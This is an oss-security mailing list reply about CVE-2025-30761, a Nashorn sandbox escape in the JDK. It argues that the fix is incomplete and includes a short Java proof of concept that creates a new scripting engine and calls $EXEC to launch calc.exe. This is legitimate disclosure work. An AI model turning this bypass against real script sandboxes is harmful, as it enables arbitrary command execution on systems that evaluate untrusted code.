Received: (qmail 5435 invoked by uid 550); 21 Jul 2025 16:20:06 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 28032 invoked from network); 20 Jul 2025 16:26:38 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=eenterphace.org;
	s=202311; t=1753028789;
	bh=pe4zEUMTUW4Yu6rPk+/hxp48ROmRCBcQMbBmjgD93q8=;
	h=Date:Subject:To:References:From:In-Reply-To:From;
	b=U7IirGoBYPq69CPwjLLnDoQ1QCJ567oqUCx4mPV4rCb9Igc8ASH0mvIK1r6cJw2cj
	 WogquZGXjVy7zgJHqWVjm0pZBGIkpnm6N152yy5zKBkXMPeczqS/DSiU4cvk/AzKlO
	 KGSuV9DgS/QBwW580eupVuSEZG6mXyWkmKSJKO4mfg0P1Ze4+SOGIPOKzLS/eLwxN6
	 5Mw2pAfF/bOlJrPV0tfcTxywdS5zPORtcTiWzgQhMT5zWOhsAvmr1tWcC4qrtbWd+v
	 prEW1CU3oDK3oF70gyYm9zxOJNiUE4f/++H/3zQfCtFdbpWzn7qwfb3aU0rIvdyZGB
	 p//665JbS75cQ==
Message-ID: <2aef7fe7-ba3d-4d6f-bcc4-19163beaaea2@eenterphace.org>
Date: Sun, 20 Jul 2025 18:26:27 +0200
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
To: oss-security@lists.openwall.com, liyajie <liyajie@openeuler.sh>
References: <c91c769394051f886c25f8bf895ec770dce36a73.162b8ce9.08a1.4e4c.b18b.2fc5a955ed5e@feishu.cn>
Content-Language: en-US
From: Moritz Bechler <mbechler@eenterphace.org>
In-Reply-To: <c91c769394051f886c25f8bf895ec770dce36a73.162b8ce9.08a1.4e4c.b18b.2fc5a955ed5e@feishu.cn>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 7bit
Subject: =?UTF-8?Q?Re=3A_=5Boss-security=5D_CVE-2025-30761=EF=BC=9AA_vulnera?=
 =?UTF-8?Q?bility_in_JDK=27s_Nashorn_Allows_for_Arbitrary_Code_Execution?=

Hi,


interesting that they "fixed" this issue now. Way back 
(<https://mbechler.github.io/2019/03/02/Beware-the-Nashorn/>) reporting 
something similar, I was told that Nashorn "sandboxing" was not supposed 
to be secure unless you also configure a SecurityManager (which 
implicitly suppresses the "engine" property). Restrictions purely based 
on a ClassFilter have been broken ever since then.

And the patch really does not address the fundamental issue, which is 
that you are able to get and configure a new engine. While the change 
may stop you from suppressing the inherited no-java flag, why not get 
direct command execution using another option instead:

System.setProperty("nashorn.args", "--no-java");
ScriptEngine e = new ScriptEngineManager().getEngineByName("nashorn");
String cmd =
"this.engine.factory.getScriptEngine(\"scripting\").eval('$EXEC(\"calc.exe\")')";
e.eval(cmd);



So, imho, the proper advice still should be not to use Nashorn for 
running untrusted code.



best regards

Moritz






